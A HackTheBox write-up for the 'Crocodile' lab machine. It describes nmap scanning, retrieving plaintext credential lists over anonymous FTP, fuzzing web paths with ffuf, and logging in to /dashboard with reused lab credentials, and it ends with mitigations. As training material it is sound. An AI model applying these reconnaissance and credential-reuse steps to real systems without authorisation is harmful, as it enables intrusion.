# Crocodile - HackTheBox Writeup

| Field | Details |
|-------|---------|
| Name | Crocodile |
| OS | Linux |
| Difficulty | Very Easy |
| Category | Machine |
| Points | N/A |
| Status | Pwned |
| Date | 2026-03-21 |

---

## Table of Contents

1. [Summary](#summary)
2. [Reconnaissance](#reconnaissance)
3. [Enumeration](#enumeration)
4. [Exploitation](#exploitation)
5. [Post-Exploitation / Privilege Escalation](#post-exploitation--privilege-escalation)
6. [Flags](#flags)
7. [Key Takeaways](#key-takeaways)
8. [References](#references)

---

## Summary

Crocodile was solved by chaining multiple weaknesses: anonymous FTP access, exposed plaintext credential files, and credential reuse on a web login panel. After enumerating FTP and downloading credential lists, valid credentials were used to authenticate to `/dashboard` on the web application and retrieve the flag.

---

## Reconnaissance

### Port Scan

```bash
nmap -sC -sV 10.129.1.15
```

**Open Ports:**

| Port | Service | Version |
|------|---------|---------|
| 21 | FTP | vsftpd 3.0.3 |
| 80 | HTTP | Apache httpd 2.4.41 (Ubuntu) |

Nmap script output also reported:

```text
ftp-anon: Anonymous FTP login allowed
```

---

## Enumeration

### FTP Enumeration

```bash
ftp 10.129.1.15
Username: anonymous
Password: anonymous
ls
```

Files discovered:

```text
allowed.userlist
allowed.userlist.passwd
```

Downloaded files:

```bash
get allowed.userlist
get allowed.userlist.passwd
```

Extracted usernames:

```text
aron
pwnmeow
egotisticalsw
admin
```

Extracted passwords:

```text
root
Supersecretpassword1
@BaASD&9032123sADS
rKXM59ESxesUFHAd
```

### Web Enumeration

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.129.1.15/FUZZ
```

Discovered endpoint:

```text
/dashboard
```

---

## Exploitation

### Vulnerability

**Category:** Misconfiguration and Credential Reuse

**Description:**
Anonymous FTP access exposed plaintext credential files, and one credential pair was reused for web authentication.

### Proof of Concept

Valid login obtained on `/dashboard`:

- Username: `admin`
- Password: `rKXM59ESxesUFHAd`

This granted unauthorized dashboard access and enabled flag retrieval.

---

## Post-Exploitation / Privilege Escalation

No local privilege escalation was required in this lab.

---

## Flags

| Flag | Hash |
|------|------|
| User flag | Retrieved from dashboard |
| Root flag | N/A |

---

## Key Takeaways

- What I learned: Credential exposure and reuse can create a direct compromise path.
- Techniques used: FTP anonymous access abuse, wordlist and endpoint enumeration, credential testing.
- Tools used: Nmap, FTP client, ffuf.
- Mitigations: Disable anonymous FTP, never store plaintext credentials, enforce credential hygiene and least privilege.

---

## References

- https://app.hackthebox.com
- https://owasp.org/www-project-top-ten/
